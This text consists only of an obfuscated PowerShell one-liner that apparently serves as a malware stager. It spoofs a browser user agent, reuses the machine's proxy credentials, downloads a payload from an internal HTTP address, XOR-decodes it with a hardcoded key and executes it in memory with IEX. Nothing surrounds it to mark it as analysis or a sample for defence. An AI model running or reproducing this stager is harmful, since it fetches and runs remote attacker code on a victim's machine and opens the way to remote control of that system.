
$Wc=NeW-OBJECT SyStem.NET.WeBCLient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeAdeRS.Add('User-Agent',$u);$Wc.PrOXy = [SysTem.NeT.WEbReqUesT]::DEFaulTWebPrOXy;$wc.PROxY.CRedentiALs = [SyStEm.Net.CredeNtiALCache]::DefaUlTNetWoRkCReDEntIALS;$K='9452f266332bbb5008b1321beff0ecf9';$I=0;[CHAr[]]$b=([ChaR[]]($Wc.DOwnlOAdSTRIng("http://10.0.0.131:8080/index.asp")))|%{$_-BXOR$k[$I++%$K.LENgTH]};IEX ($b-JoIn'')

